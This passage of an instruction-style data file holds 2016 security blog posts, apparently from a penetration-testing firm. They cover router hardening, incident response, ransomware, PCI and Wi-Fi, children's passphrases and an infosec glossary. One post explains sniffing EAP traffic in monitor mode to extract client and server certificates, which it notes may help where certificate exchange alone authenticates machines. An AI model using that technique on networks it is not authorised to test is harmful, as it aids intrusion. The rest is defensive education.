off Wi-Fi Protected Setup (WPS) and  the UPnP feature, if you can. This may sound counter intuitive, but there are design flaws in WPS which allow attackers to brute-force an access code relatively quickly. The UPnP feature allows compatible devices to change router settings without going through the router interface, a very appealing prospect to network intruders. However, many gaming consoles utilize this, so it might not be feasible to disable it. You will also want to keep remote access turned off unless you need it.\nEnsure that you logout of the router interface when you\u2019re finished. It is also wise to pay attention to the devices on your network, naming the various devices will help you recognize if there is an unfamiliar connection.\nIt\u2019s easy to point out how unlikely it is someone would spend time trying to get into your specific network, but why take the risk when you can improve the security of your devices by changing some simple features?\nInformation Sources:\nhttp://mjg59.dreamwidth.org/40505.html#cmt1611577\nhttp://www.cnet.com/how-to/home-networking-explained-part-6-keep-your-network-secure/\nhttps://www.us-cert.gov/ncas/tips/ST15-002\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"TLS Certificates from EAP Network Traffic\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Joff Thyer, Red Team, Red Team Tools, EAP Network, TSL Certificates\"\nCreation Date: \"Wed, 09 Mar 2016 22:44:40 +0000\"\nJoff Thyer // \n\nA network can authenticate a client workstation using the 802.1X and Extensible Authentication Protocol (EAP) using multiple different methods.  EAP is used both in a wired network context as well as a wireless network context.   It is fairly common for EAP-PEAP to be used for most authentication in enterprise networks, although EAP-TLS can be used also.\n\nEAP-PEAP (EAP-PEAPv0) is the most common form of EAP in use whereby MSCHAPv2 encoded credentials are protected inside of a TLS tunnel.   The TLS tunnel is established using a server presented certificate delivered using RADIUS protocol to the authenticator (switch or wireless controller), and then delivered using EAP to the 802.1x client/supplicant.  The client/supplicant must then validate the certificate chain of trust before establishing the TLS tunnel.   Once the tunnel is established, MSCHAPv2 is used to send username, and password credentials to the RADIUS server.\n\nEAP-TLS is very similar to EAP-PEAP only that mutual TLS certificate authentication is performed.  The client supplicant presents a client certificate which is validated by the server, and then the RADIUS server presents a server certificate which is validated by the client.  After the certificate exchange process completes with an appropriate chain of trust validation, authentication credentials may be presented across the TLS tunnel.  In some organizations, credentials are not even validated and the mere exchange of mutually signed certificates is sometimes considered sufficient.\n\nIn the Wireless network context using WPA2-Enterprise mode, all of the EAP transactions occur in cleartext as the pairwise master key calculation for AES based encryption cannot be completed before authentication credentials are exchanged.\n\nThis means that when using a sniffer on a wired port, or in the wireless airspace, the certificates that are exchanged can be captured.   This might be useful information if (as some organizations implement) mutual certificate exchange is deemed sufficient for machine-based authentication.\n\nNote: In the world of 802.1x, and Microsoft Windows, the 802.1x supplicant is implemented with a dual-level authentication.  A machine credential can be presented upon machine boot, and a user credential presented when the user logs into the machine after the boot phase.\n\nIn order to capture the bytes of X.509 certificates during an EAP-TLS exchange, either configure wireshark to monitor a wired interface that represents a passive network tap between a client workstation and network switch, or configure a monitor mode wireless network interface.   A wireless command-line example is:\n\n# iw dev wlan0 interface add wlan0mon type monitor\n\nIn order to capture EAP traffic in Wireshark, it is simplest to enable a display filter by using the keyword of \u201ceap\u201d.\n\nAfter enabling the display filter, perform the login sequence on the client workstation in question by rebooting the machine, and re-authenticating, or even by simply disconnecting and reconnecting the wired network interface.\n\nAssuming a full authentication sequence is successful, you should see a packet capture similar to the diagram below.\n\nThe authenticator (Wireless AP, or network switch) sends an EAP \u201cRequest Identity\u201d message and assuming the client workstation is configured correctly, it will respond with a \u201cResponse Identity\u201d message.\n\nAssuming things are configured correctly, the authenticator will then request EAP-TLS protocol as seen in packet 188 listed above.\n\nWhat is of interest to us starts at packet 192 whereby the actual certificates are exchanged.  In this exchange, we should be able to export the certificate both presented by the client as well as the certificate presented by the server.  In addition, RADIUS servers will often send the Certifying Authority (CA) certificate along with the RADIUS server certificate itself.  Altogether we may extract three total certificates.\n\nNote that EAP packets are OSI layer 2 and thus limited to the MTU of the transmission medium which will most often be 1500 bytes or less.  Thus the EAP protocol will fragment the certificate data over multiple frames.  Having said that, Wireshark is kind enough to reassemble these fragments.\n\nLooking at frame 192 in the wireshark capture, we can see that the protocol dissector shows us two different certificates in the \u201cSERVER HELLO\u201d packet, one of which has the common name of \u201cliving.thyer.org\u201d (the RADIUS server), and the other has the common name of \u201cROOT-CA\u201d (the certifying authority).\n\nTo save the certificate, a simple byte export is required by highlighting the \u201cCertificate\u201d field in the protocol dissector window, right-clicking, and selecting \u201cExport Selected Packet Bytes\u201d.\n\nThis can be repeated for ALL certificates in the EAP packet exchange.  After this has been completed, you should successfully have a binary certificate (DER) representation of either two or three certificates contained within the EAP traffic.\n\nThe diagram below shows the client-side certificate starting in packet number 207.\n\nIn order to validate the certificate format and information, you can use OpenSSL on the command line to read the certificate.\n\n# openssl x509 -inform DER -in cert.der -text\n\nTo convert back to PEM (base64) format, you can specify the OpenSSL \u201c-out\u201d flag with a new filename.\n\n# openssl x509 -inform DER -in cert.der -out cert.pem\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"That One Time My Parents Were Hacked\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, bad tech support, canon, family, mistakes, ransomeware, Spyware, tech support\"\nCreation Date: \"Fri, 11 Mar 2016 22:52:02 +0000\"\n\nHeather Doerges //\n\nMy mom called the other day. It started out, \u201cHonestly, your father.\u201d Which, isn\u2019t a strange way for her to start a conversation about my dad.\n\u201cWhat did he do this time?\u201d I asked \u2026\nIt all started out rather honestly, the poor guy belongs to a photo club. He decided he\u2019d go out and buy an expensive Canon color photo printer. He just wanted to print his photos to share with the club. It didn\u2019t even cross his mind that something bad could happen.  So, he got his printer, hooked it up and started working with his photos to get them printed. Yet, every time he printed a picture the size was never right.  SO, he googled \u201cCanon Tech Support\u201d online. He clicked on the first site that popped up and found the phone number for the tech help he was looking for.\nBut... it wasn\u2019t Canon.\n\n\u201cOh yes sir, we can help you. It sounds like a problem with your computer. Let us come in to your computer and help you.\u201d\nBecause no one was there to say, \u201cHey!  Are you crazy?!?! Don\u2019t let those guys into your computer.\u201d He agreed, and they were in just like that\u2026and, so was the virus they planted.\nTo me, that is one the scariest things, other people in other places should NOT be able to move your mouse around, access your computer or even pretend they work for Canon.\nThe thing is, if you let \u201cthem\u201d in, \u201cthey\u201d will come. Sometimes, it isn\u2019t as obvious as what my dad did. A lot of people will say, well, \u201cDuh, why would you ever just let someone in your computer? Even if it is for technical support.\u201d  But, have you ever just been looking something up online, or connecting with friends on social media and clicked on the little ad that pops up?\u201d  It\u2019s the same thing, we are all guilty. It may not be as severe, the skull and crossbones virus death mask won\u2019t appear on your computer screen, but, if you keep clicking on the unsolicited ads or pop up talking videos, then your computer starts to run slower\u2026and slower\u2026and s\u2026l\u2026o...w...e...r\u2026\u2026\u2026\u2026.\nAdware, spyware, malware exist. An article from Purdue University, states, \u201cMany users inadvertently download spyware or adware when downloading other programs. Many popular peer to peer applications and other software packages include adware or spyware packages. Even seemingly innocuous programs such as special cursors can contain spyware. In addition, many websites and advertising banners set cookies on your system that track your web usage.\u201d\nSO??? Why is that dangerous? The article goes on to state, \u201cSpyware and adware can gather information about you, your browsing habits, as well as other data. Cookies set by websites can allow these applications to track which websites you visit; this is especially dangerous as some cookies can contain user login and password information for the website which created it. In addition, spyware and adware can slow your system down, hog system resources, and use network bandwidth. Some spyware and adware can even be malware and open your system to attack or cause system problems.\u201d Then, you got bugs.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"For the Record - My First Confession\"\nTaxonomies: \"Fun & Games, baby faced john, family, infosec, john strand, memories, wedding\"\nCreation Date: \"Mon, 14 Mar 2016 22:36:19 +0000\"\n Melisa Wachs //\n\nMany, many years ago John laid on the bathroom floor during his wedding reception near tears and screaming. This was not due to any amount of alcohol consumed, or lethargy induced by jamming out to the Foo Fighters, or (as you may assume because of the setting) food poisoning.\nNope, the reason for his tile-cuddle agony was me.\nLet me back up. John is my boss, yes, but firstly he is my older brother. John\u2019s football shoulder injury brought us together on several occasions when I was a young girl. When he threw his shoulder out by reaching into the dryer, I was the one who reset it back into place when mom and dad were gone. It was always an intense moment: a knowing nod, a count of three, a quick shove, pop and scream, and it was reset. It was something he could never do alone, and he especially needed me as we lived 40 miles from town.\nHis wedding reception? Well, all I wanted to do was cover the grooms face in makeup. Harmless request, really. But, he had to resist, so I sent a hackle of kids after him into the bathroom and they were a bit too effective. I felt terrible that day and still do today. Even though I was there for him to lean on time and time again, it doesn\u2019t take away the fact that I messed up and hurt my brother.  But we\u2019re family, we\u2019re in this journey of life together. We\u2019re bound together, so we forgive and move on.\n\nHours Before the Incident\nWorking at Black Hills Information Security and seeing some of our customers\u2019 situations, I realize that the parallel of family life often shadows the business world. At times the struggles of needs versus wants, or deliberate offenses versus unintentional mistakes are very apparent. This is especially the case with Information Security. It seems that the most needed resources for IT professionals is time. Time to research, time to install, time to patch, time to log and report\u2026 time, time, time.\nFor those of you who work in IT departments, you know you are constantly resetting the shoulder of your corporation. Taking the time to help individuals may seem wasteful. Everyone depends on you at some point, and when they\u2019re panicking, you\u2019ve got them covered. In a way you\u2019re the hidden backbone of the \u201cfamily.\u201d The time spent with coworkers, helping them through IT, social engineering, or software situations is never wasteful if spent helping to educate them as well. You\u2019re in it together after all, right?\nNever once has anyone at BHIS talked down to me for asking questions. Our penetration testers always have time to address the support staff with absolutely any question. Gracious explanations on something simple, like how to use PDF pen, lead to an openness for other matters of greater importance, like setting up two-factor authentication. It\u2019s a relationship that is based upon trust. I feel very vulnerable when I admit that I struggle with something I know is very basic for our testers. How our testers respond to behind-the-scenes employees in turn affects how comfortable we are with potentially important situations. Again, it shadows a family. If the relationship is strong it makes bringing up mistakes and seeking any needed remediation much easier.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Public Wi-Fi Insecurity - Part Deux, For Compliance Sakes\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, InfoSec 101, Jordan Drysdale\"\nCreation Date: \"Wed, 16 Mar 2016 22:38:25 +0000\"\nJordan Drysdale //\n\n(See Jordan's Part 1 of this post here.) PCI-DSS strolled into town with the latest compliance package of minutiae laden IT speak at the end of last year. Business owners are now saddled with mapping, understanding and creating policies and procedures for handling \"credit card data flow.\" For the majority of these firms, dedicated IT staff and IT security knowledge are non-existent. So, how - you should be asking by now - are PCI compliance and public Wi-Fi insecurity related to each other? In most cases of small to medium business where IT is non-existent or is a one person operation AND you find public wireless offerings, we can bet it's all connected together. Let's bottom line this thing: if your IT budget is in the low thousands to zero range, you should not be providing public Wi-Fi.   \n\nReason number one: your company swipes credit cards, some firm out there processes your payments and expects you to be PCI compliant. The moment a wireless network is deployed at a business, a big red flag goes up. Sure, it is possible with extensive RADIUS configuration, certificate deployment and a couple hours of testing to do it right, but guess what? If you have no idea what I just said, your Wi-Fi probably isn't secure. Let's revisit IT budgets again; who connected this shiny new wireless device to the network? Did they connect it to the corporate network? Do \"credit card data flows\" traverse the same network? If no one has any clue and the network map doesn't reflect this new install, hardware upgrades or additions, and you forgot the change management policies and procedures documentation, guess what? You are not PCI compliant.\n\nLet's clarify another critical item for getting PCI compliance right: scope. Reason number two you should avoid wireless altogether: you are responsible, as a credit card merchant, for any and all loss traced back to theft on your network. If an organization is lacking the basic tenets of network management - like a network map, responsible network use policies, change management and web filtering - your organization will be forced to ingest an auditor hired by the credit card company whose customers lost money. I assure you in nearly every one of these cases, the small to medium business is found liable.\n\nHere is one more reason your organization probably should not be offering public Wi-Fi: responsibility. If a business provides the medium over which malfeasance occurs, the business is responsible. Back to budgets: if your budget does not include web filtering, whitelisting, data loss prevention and active management, you should not be providing public wireless. Whether or not you understand these things, they are part of the basics of IT and network security. Now, when your public Wi-Fi network is used by someone whose actions result in harm or injury and you did not implement content (porn, dark sites, worse) restrictions, you are responsible.\n\nIn the event something bad did happen on your network and you turned in a cyber insurance claim, you should expect an auditor. Your cyber insurance provider is going to send someone out to review your policies and procedures and interview your staff. If you do not have policies to cover the handling of credit cards and your staff is not trained on them, you are liable. If your credit card network is running on the same network as your corporate data, you are probably liable. This auditor will probably ask to see your credit card data map. Oh yeah, are you asking your customers to \"dip the chip\" or swipe their card? If they aren't using chip and pin as of this writing, you are liable.\n\nTo minimize the systems in scope you should order your credit card scanners to be installed on \"old school\" telephone lines. Those telephone line based credit card machines should support chip and pin. Your employees should be regularly reminded of their role in IT systems and security. Review sample policies and procedures for handling sensitive data from the SANS Institute and create some for your own organization! Vet your IT vendors; ask people from your social circles who they trust in your area. When installing or deploying new solutions, ask what your network looks like after your vendor is done - get a new network map. Last, get rid of your public Wi-Fi, it could well cost your business way more than a \"Your-Guest\" Wi-Fi network is worth.\n\nLinks\n\nSANS: https://www.sans.org\n\nSANS Policies: https://www.sans.org/security-resources/policies\n\nHow to Approach PCI: https://www.pcisecuritystandards.org/documents/Prioritized_Approach_for_PCI_DSS_v3-1.pdf\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Incidence Response\"\nTaxonomies: \"InfoSec 101\"\nCreation Date: \"Mon, 21 Mar 2016 17:46:12 +0000\"\nDarin Roberts //\n\nAccording to the Identity Theft Resource Center, there were 781 data breaches tracked in 2015.  That is, on average, over 2 per day.  And that represents only the data breaches that were reported by legal requirements or that were reported by news media.  This is the second highest year on record (since 2005).  It isn\u2019t a matter of if you will get breached, it is only a matter of when.\n\nSo what are you going to do about it?  You can try to prevent it as much as possible, but what are you going to do when the inevitable happens and there is a breach?  Here is a quick outline of some of the things that should be done if and when the unfortunate event happens.  I will use as the basis of my outline the information from the SANS Incident Management Model.\n\nThroughout this whole process you should remember to document everything that has happened and what you are doing.  In the case that something goes wrong in your process you will be able to see what you did and undo any mistakes.  If it all went well, you will have some great information for when something else happens in the future.\n\n  Prepare\n\nLong before you have an incident, you need to be preparing for it.  You need to have all of the policies and procedures in place prior to the problem even arising.  If you have an issue and you need to look through your employees\u2019 computers, do you have permission to do so?  When you find that there is a problem, who is going to be in charge?  What are the steps you will take to proceed to get back to a normal working condition?  If you aren\u2019t a large enough organization to have your own IT department, or just need some backup, who are you going to call to help you through the process?  These, along with many other questions, need to be thought out before the incident occurs.\n\nAfter you have prepared, the next steps become much more manageable.  While it will still cause you problems to return to life as usual, you will not be wondering what to do.  Preparation is the first and probably the most important step to take, but it must be done prior to the incident.\n\nIdentify\n\nThe first thing you should identify should be the person who is going to be handling your incidents.  You should have a system in place so you know who to contact and who will be in charge.\n\nYou also need to make sure that something really took place.  What systems are affected, and who needs to be told?  Is it only an isolated incident, or is it widespread and affects many systems?  Identification can be difficult.  Even if you have identified something has happened or is happening, it is even more challenging to understand the type, extent and magnitude of the problem.  It might be a good idea to have a company at the ready to aid in identification of incidents.\n\nContainment\n\nPrior to an incident, you need to have a plan in place that will help determine strategies of containment.  If your system has been breached, you should know exactly what to do before you have identified the problem.  Are you going to shut down the system, disconnect if from the network, or just turn a certain function(s) off?  Obviously the severity of the issue will determine what processes you will take to contain the issue, but determining beforehand will make those decisions much simpler and quicker.\n\nDuring the containment phase you should gathering information and evidence.  The evidence should be used to help fix the issue, but it also could be useful in the case of legal proceedings.  Again, documentation during this phase is critical.  You should log all that you are doing.\n\nEradication\n\nAfter you have contained the incident, the next step is to remove it.  This can sometimes be a tricky step in the process.  Sometimes it can be as easy as running an antivirus or spyware scanner or you may need to restore from a backup and patch your system to fix any known vulnerabilities.  If you do a restore, make sure that the original is not infected as well.\n\nAs part of the preparation phase there are things you can do to make eradication much simpler.  If you take the time to have a standard configuration for your systems, restoring will be easier than if each system has its own configuration.  The more standard your systems are, the quicker the restore will be.\n\nRecovery\n\nRecovery is putting everything back together.  Again, standardizing systems will make this much easier.  What are you going to do to prevent this from happening again?  Is it going to be hardware changes, software changes, patches, password rule changes?  Is it going to be building security?  Even after you are back up and running, you need to work on prevention so this incident doesn\u2019t repeat itself.\n\nLessons Learned\n\nAfter you have put Humpty Dumpty back together again, you need to sit down with your Incidence Response Team and talk about lessons learned.  With all of your copious notes and documentation, you will have some great information to go through and talk about.  Maybe you need to go back and do some more preparation, maybe you need to do more identification on who should be in charge.  You might need to revamp your containment procedures.  If you don\u2019t learn from what has happened, you have wasted a great opportunity.\n\nWhile it is never a comfortable situation to be compromised, it is possible to make it easier on you and your organization.  Preparation before the incident can go a long way in getting back to normal.  And learning from not only the incident itself, but how you respond to it, will help you improve preparations and handle the next one when it comes.\n\nResources\n\nMason Pokladnik, Gold Paper, 2007,  https://www.sans.org/reading-room/whitepapers/incident/incident-handling-process-small-medium-businesses-1791\n\nhttp://www.idtheftcenter.org/ITRC-Surveys-Studies/2015databreaches.html\n\nhttp://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Risky Business\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, b2b, back ups, backing up, business partners, infosec, ransomware, risk du jour\"\nCreation Date: \"Wed, 23 Mar 2016 20:58:09 +0000\"\nMike Perez // \nAt BHIS, a few of our customers have come to us very recently with the \u201crisk du jour\u201d; no, not the Cash for Creds program Beau highlighted but the risk posed when they discover that a business partner or far flung subsidiary has been hit by some ransomware variant.  Side note: Be sure to take a listen to our recent ransomware webcast!\nTo that end, we came up with some quick and dirty recommendations.  Note that these recommendations also apply when you've got a partner that has suffered a breach or major infection. \n\n Delineate all business processes/possible interactions (business to business links or automated workflows, etc.) that touch your partner.  Isolate those processes and treat any data coming from that partner as potentially hostile or malicious.  Set up a dedicated phone or in-person meeting to review with your partner how they are specifically handling those business interaction points post-incident.\n\n Treat all documents received from your partner within the timeframe of the Incident as hostile and investigate those systems that process those workflows for any signs of malware.\n\n Enable an SMTP gateway rule specifically flagging email from their domain so it is obvious to the recipients (I.e., your employees) and that automatically quarantines or if appropriate, deletes the attachments.  Some email systems will allow you to pre-pend \u201c[EXTERNAL]\u201d or other such flag in the subject line so that employees can readily see internal vs. external email.  Consider a rule which prepends your partner\u2019s name so folks are extra vigilant.  An example is below.\n\nUse a segmented and dedicated jump server to initiate any host to host communications with that partner.\n\n Request to be put in contact with any law enforcement personnel that your partner has contacted.  \n\n Report this incident to your local law enforcement contacts.  Leverage FBI and InfraGard contacts to provide you with current information on ransomware incidents in both your geographical area and in your particular industry.\n\n Ask your partner if they have any anecdotal stories of partners also being infected.\n\n Start refreshing and also testing your disaster recovery and business continuity plans.\n\n Test your backups.  (You ARE backing up\u2026. Right?)\n\n Stay paranoid, because now that folks have paid and it's gotten press coverage, the wolves smell blood.\n\n \nYours in paranoia,\nMike\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Passphrases for Tiny People\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, internet safety for kids, passphrase, passphrase for kids, passphrase lessons for kids, password lessons for kids, passwords, passwords for kids, teaching children about passwords, teaching kids about passwords, teaching kids internet safety, tiny people\"\nCreation Date: \"Fri, 25 Mar 2016 19:25:29 +0000\"\nGail Menius //\n\nOnce upon a time, in a land not too far away (about two miles from where I\u2019m sitting now) I used to be an elementary school librarian.  The kids and I used to read books together...look for books in the library together.  We would even explore the internet together.  \nWhen they got to be about eight years old, I would teach them how to make passwords for our learning management system.  I used to use the curriculum on CommonSenseMedia, here is a lesson plan for k-2: https://www.commonsensemedia.org/educators/lesson/powerful-passwords-k-2.  \nThe scope and sequence for common sense media is great.  But I found that this particular password lesson had a family guidance sheet for creating passwords that is a little behind the times when it came to password guidance.  The guidance suggests eight characters with hard to remember passwords which include numbers and symbols.  Even 5th graders have a hard time finding and using symbols on a keyboard.   So when I followed the curriculum \u201cto the letter\u201d, the kids had a super hard time coming up with and remembering their passwords, and even worse, they would tell each other their passwords.  \nSo on password day, I would do a different lesson, one that helped them to create and remember their passwords.  Since I\u2019ve been working at Black Hills Information Security, I decided to publish my lesson plan with a few tweaks for my friends at Knollwood Elementary School and any other teacher who is interested in Common Sense Media or creating strong passwords for tiny people. \nWe don\u2019t want children getting in the habit of writing down their passwords and just handing them out willy nilly.  So I\u2019m going to show you a way to get kids to come up with a password on their own.  Then we will call their parents, grandma, or whomever their password manager.  This way, when they get a little older, they will know that a password manager is where they go to get their passwords so they don\u2019t have to remember all of them.)\nHere is a two-day lesson I think you can do with a child or a group of children to help them come up with a passphrase.\nObjective\n\nRecognize that short passwords are easy to crack\nCreate a passphrase that keeps your information safe.\n\nMini-lesson 1\nPrior Knowledge\nMake sure that the children have seen you log ito a site before and have said the word \u201cpassword\u201d or \u201cpassphrase\u201d when you log in.  Have something that the kids will actually make a password for.  Here are a list of sites that can be used: (something you need to protect, like a piggy bank).\nhttps://code.org/learn\nhttp://www.abcya.com/\nhttps://www.khanacademy.org/\nhttps://www.edmodo.com/\nhttp://www.starfall.com/\nhttps://www.khanacademy.org/\nMaterials\nPaper (3) and Markers or Promethean or Smartboard\nConnection\nRemember when I went to Learncode (or whatever you use) and put in a password to be able to play the games?\nTeach\nToday we will make a Password. Next time we meet we will make a passphrase (Both are something that you type to let you into a website that protects your private information.) \nShow examples of passwords.\nActive Engagement\n1. Come up with toys that are fun to play with together and write them on the Promethean for them as they come up with ideas.Toys:\n\nCar\nTruck\niPad\nBarbie\n\n2. Come up with numbers and write them on the board as well.\nNumbers:\n\n10\n11\n12\n13\n\n3. Then have them a word and a number and put them together to make a password.  Show them an example of how to do it.  Then have them help you do one. \nPasswords:\n\ncar10\nbarbie12\n\nClose\n\nIf I asked you to guess my password, how would you do it?\nAsk them to turn and talk with their neighbor how you would guess the password.\n  Show them how long it will take to crack: https://howsecureismypassword.net\n\nLink to future Learning\nNext time we meet we will make something even harder to guess than a password.  It\u2019s called a passphrase.  Instead of having just a word and a number together, it will be three or more words together.  \n \nMini-lesson 2\nMaterials\nList of passwords you made last time.\nPaper  or notecards and pencil for students.\nSmartboard or promethean for writing an example passphrase and writing a passphrase together.\nConnection\n\u201cRemember how we made passwords that were easy to guess?\u201d\n\u201cToday I will write a passphrase and give it to a password manager.  (My mom).\nHere are some examples:\u201d\n\nwhenigrowupiwanttobeadoctor\nmygrandmamakesthebestcake\nBlueracecarsarecool\n\n\u201cWhat do they have that is the same?\u201d (Have students turn and talk to their neighbor)\nA passphrase is a password that is super hard to guess.  It\u2019s a group of words that make sense together so they\u2019re easier to remember.  Who thinks this would be harder to guess than the passwords we made last time?  \nTeach\n\u201cFirst I will pick a sentence that you would like to finish.\u201d \nSentence starters list (on the promethean board):\n\nI like to\nWhen I grow up I want to be\nMy mom likes to\nMy cat is funny when she\nMy best friend is\nMy favorite animal is a\nMy favorite food is\nThe best sport is\n\n\u201cThen I will write the sentence starter I like best.  It is\u2026\u201d. (write that down on the other paper so everyone can see).\nDemonstrate writing a sentence.  \u201cWhen I grow up I want to be an astronaut.  Then when I am finished, I will draw a picture on the back of the paper of me being an astronaut.\u201d\nActive Engagement\n\u201cNow it\u2019s your turn.  PIck a sentence starter that you like and write it down.  When you are done, turn your paper over and draw your picture.  If you  need help spelling something, you can raise your hand or ask your neighbor.\u201d (Go around and help them finish writing their sentence.)\n(When everyone is done, then you take your sentence and turn it into a passphrase by taking the spaces out.)\nPassphrase:\nWhen I grow up I want to be an astronaut.\nwhenigrowupIwanttobeanastronaut\nClose\nThen as a wrap-up activity, you can show them how long it takes a computer to crack a password.\nEnter student passphrases into the website to show how long it would take to crack it:\nhttps://howsecureismypassword.net/\nThen tell them that you will be their password manager, and collect their cards.  Make sure they have their names on them before you take them.\nLink to future learning:\n\u201cNext time we will practice typing passwords.\u201d\n \nResources:\nhttps://www.commonsensemedia.org/educators/lesson/powerful-passwords-k-2\nhttps://howsecureismypassword.net\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Information Security Glossary - v2\"\nTaxonomies: \"InfoSec 101, glossary, industry terms, information security, infosec, terms\"\nCreation Date: \"Mon, 28 Mar 2016 14:28:11 +0000\"\nOriginal by Bob Covello, CISSP / Modified with permission by BHIS //\n\nNote: This glossary was started to answer questions related to information security. It will be updated as required.  This is not an original work and it should not be treated as such. Most of the information herein has been gathered from many publicly available sources.\n\n_________\n\nNumerical entries\n\n1337\n\nsee L33tSpeak\n\n42\n\nThe number 42 is often referenced in hacker communities, and in various technical publications.  It is intended as a humorous tribute to author Douglas Adams.  Here is a short description of its origin:\n\nThe number 42 is, in The Hitchhiker's Guide to the Galaxy by Douglas Adams, \"The Answer to the Ultimate Question of Life, the Universe, and Everything\", calculated by an enormous supercomputer named Deep Thought over a period of 7.5 million years. Unfortunately, no one knows what the question is. Thus, to calculate the Ultimate Question, a special computer the size of a small planet was built from organic components and named \"Earth\".\n\nA\n\nAdvanced Persistent Threat (APT)\n\nThe APT acronym was first popularized in a 2013 Mandiant Corporation (now FireEye) report (\u201cAPT1: Exposing One of China's Cyber Espionage Units\u201d available at http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf) that outlined the habits of a group of government-sponsored hackers who targeted specific organizations with a specific goal.  The sophistication, strategic direction, and often damaging characteristics of these attacks were given the name \u201cAdvanced Persistent Threat\u201d.\n\nAdware\n\nSoftware that is provided for free but contains advertisements\n\nAPT\n\nSee Advanced Persistent Threat.\n\nAuthorization creep\n\nAuthorization creep occurs when an employee changes job functions and retains unnecessary permissions that were required for the previous job responsibilities.  This may result in an employee with inappropriate access to data\n\nB\n\nBlack Box Test\n\nTesting done with very little or no information regarding target makeup, or internals, or protections.\n\nBlue Team\n\nRed team-blue team exercises take their name from their military antecedents. The idea is simple: One group of security pros--a red team--attacks something, and an opposing group--the blue team--defends it. Originally, the exercises were used by the military to test force-readiness. They have also been used to test physical security of sensitive sites like nuclear facilities and the Department of Energy's National Laboratories and Technology Centers.\n\nBotnet\n\nAbbreviation of \u201cRobot Network\u201d.  This is a network of compromised computers administered by a person who controls the activity of the computers through a remote console.\n\nC\n\nC&C\n\nSee Command and Control\n\nC2\n\nSee Command and Control\n\nCFAA\n\nSee Computer Fraud and Abuse Act.\n\nClone Phishing\n\nA type of phishing attack whereby a legitimate, and previously delivered, email containing an attachment or link has had its content and recipient address(es) taken and used to create an almost identical or cloned email. The attachment or link within the email is replaced with a malicious version and then sent from an email address spoofed to appear to come from the original sender. It may claim to be a resend of the original or an updated version to the original. This technique could be used to Pivot from a previously infected machine and gain a foothold on another machine, by exploiting the social trust associated with the inferred connection due to both parties receiving the original email. See also: Phishing, Spear Phishing, Whaling, and Watering Hole Attack.\n\nCommand and Control\n\nCommand and control (C&C, also known as C2) is traffic flowing from compromised devices and the controllers of the botnet.\n\nCommon Vulnerabilities and Exposures (CVE)\n\nA reference method for publicly known information security vulnerabilities and exposures. The system is maintained by MITRE Corporation with funding from various government agencies. CVE Identifiers (also referred to by the community as \"CVE names,\" \"CVE numbers,\" \"CVE entries,\" \"CVE-IDs,\" and \"CVEs\") are unique, common identifiers for publicly known cyber security vulnerabilities. (Web Site: https://cve.mitre.org/.)\n\nCommon Vulnerability Scoring System (CVSS)\n\nAn open industry standard for assessing the severity of computer system security vulnerabilities. Under the custodianship of NIST, it attempts to establish a measure of how much concern a vulnerability warrants compared to other vulnerabilities so remediation efforts can be prioritized. The scores are based on a series of measurements (called metrics) based on expert assessment. The scores range from 0 to 10. Vulnerabilities with a base score in the range 7.0-10.0 are High, those in the range 4.0-6.9 as Medium, and 0-3.9 as Low. (Web Site: https://www.first.org/cvss.)\n\nComputer Fraud and Abuse Act (CFAA)\n\nEnacted by Congress in 1986 as an amendment to existing computer fraud law (18 U.S.C. \u00a7 1030), which had been included in the Comprehensive Crime Control Act of 1984. It was written to clarify and increase the scope of the previous version of 18 U.S.C. \u00a7 1030.  In addition to clarifying a number of the provisions in the original section 1030, the CFAA also criminalized additional computer-related acts. Provisions addressed the distribution of malicious code and denial of service attacks. Congress also included in the CFAA a provision criminalizing trafficking in passwords and similar items.\n\nThe Act has been amended a number of times.\n\nCookie\n\nA small piece of data sent from a website and stored in a user's web browser while the user is browsing that website. Every time the user loads the website, the browser sends the cookie back to the server to notify the website of the user's previous activity. Cookies were designed to be a reliable mechanism for websites to remember stateful information (such as items in a shopping cart) or to record the user's browsing activity.\n\nCovert Channel\n\nA type of computer security attack that creates the capability to transfer informational objects between processes that are not supposed to be allowed to communicate by the computer security policy.\n\nCross-Site Scripting (XSS)\n\nThe act of loading an attacked, third-party web application from an unrelated attack site, in a manner that executes a fragment of JavaScript prepared by the attacker in the security context of the targeted domain.\n\nCrystal Box Test\n\nElements of Grey box (see below) with available documentation or even source code.\n\nCross-Site Request Forgery (CSRF, or XSRF)\n\nA type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts. Unlike cross-site scripting (XSS), which exploits the trust a user has for a particular site, CSRF exploits the trust that a site has in a user's browser. Cross-Site Request Forgery is often achieved through cookie and session hijacking.\n\nCVE\n\nSee Common Vulnerabilities and Exposures.\n\nCVSS\n\nSee Common Vulnerability Scoring System.\n\nD\n\nDAC\n\nIn computer security, Discretionary Access Control (DAC) is a type of access control in which a user has complete control over all the programs it owns and executes, and also determines the permissions other users have to those files and programs. Because DAC requires permissions to be assigned to those who need access, DAC is commonly described as a \"need-to-know\" access model.\n\nDDoS Attack\n\nSee Distributed Denial of Service Attack\n\nDenial of Service Attack\n\nAny action whether intentional, unintentional, malicious, or innocuous which results in a disruption or reduction in data services.\n\nDFIR\n\nSee Digital Forensics and Incident Response.\n\nDGA\n\nSee Domain Generating Algorithm.\n\nDigital Forensics and Incident Response (DFIR)\n\nDigital forensics is the process of uncovering and interpreting electronic data for use in a court of law. The goal of the process is to preserve any evidence in its most original form while performing a structured investigation by collecting, identifying and validating the digital information for the purpose of reconstructing past events. Incident response is the act of preparing for and reacting to an emergent event, such as a natural disaster or an interruption of business operations.\n\nDistributed Denial of Service Attack (DDoS)\n\nThe use of multiple machines to create a traffic flow that slows or halts data services on a targeted network.\n\nDomain Name System (DNS)\n\nThe 